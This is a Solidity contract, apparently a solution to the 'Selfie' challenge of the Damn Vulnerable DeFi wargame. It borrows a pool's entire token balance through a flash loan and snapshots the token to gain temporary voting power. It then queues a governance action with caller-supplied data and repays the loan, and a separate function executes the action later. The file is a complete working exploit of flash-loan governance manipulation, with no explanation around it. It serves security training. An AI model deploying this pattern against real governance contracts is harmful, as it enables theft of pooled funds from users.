// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack is IERC3156FlashBorrower {
    SimpleGovernance public governance;
    SelfiePool public pool;
    DamnValuableTokenSnapshot public snapshotToken;

    uint256 public actionId;
    address public owner;

    error UnexpectedFlashLoan();

    constructor(
        SimpleGovernance _governance,
        SelfiePool _pool,
        address _token
    ) {
        governance = _governance;
        pool = _pool;
        snapshotToken = DamnValuableTokenSnapshot(_token);
        owner = msg.sender;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        if (
            initiator != address(this) ||
            msg.sender != address(pool) ||
            token != (address(snapshotToken)) ||
            fee != 0
        ) revert UnexpectedFlashLoan();

        snapshotToken.snapshot();
        actionId = governance.queueAction(address(pool), 0, data);

        snapshotToken.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }

    function executeFlashLoan(bytes calldata _data) external {
        require(msg.sender == owner);
        uint256 poolBalance = snapshotToken.balanceOf(address(pool));
        pool.flashLoan(this, address(snapshotToken), poolBalance, _data);
    }
}
